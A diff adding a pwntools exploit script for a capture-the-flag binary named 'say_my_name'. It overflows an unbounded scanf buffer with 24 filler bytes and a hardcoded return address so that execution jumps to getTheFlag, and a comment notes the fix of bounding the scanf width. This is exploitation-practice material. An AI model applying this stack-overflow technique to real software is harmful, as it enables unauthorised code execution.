@@ -1,0 +1,42 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from pwn import *
+
+exe = context.binary = ELF("./say_my_name", checksec=False)
+context.log_level = "error"
+
+""" In the function welcomeMe a scanf is used without limiting characters. 
+As such, we can find out the static address of the getTheFlag function via GDB, 
+and override the return address on the stack to jump to it.
+Simply limit the characters read by scanf. I.g. 'scanf("%20s", buf)'. """
+
+def start(argv=[], *a, **kw):
+    gdbscript = """
+    tbreak main
+    continue
+    """.format(
+        **locals()
+    )
+
+    if args.GDB:
+        context.log_level = "debug"
+        context.terminal = ["tmux", "split", "-h"]
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, aslr=False, *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+# you can also create new functions here
+
+def main():
+    io = start()
+
+    io.recvuntil("Please enter your name:")
+    # fill with characters (20 for the buffer + 4 for the saved base pointer)
+    # then override with '0x80491a0', the addr of getTheFlag()
+    string = b'a'*24 + struct.pack('<I', 0x80491a0)
+    io.sendline(string)
+    answer = (io.recvall())
+    print((answer.split()[2]).decode("utf-8"))
+
+if __name__ == "__main__":
+    main()
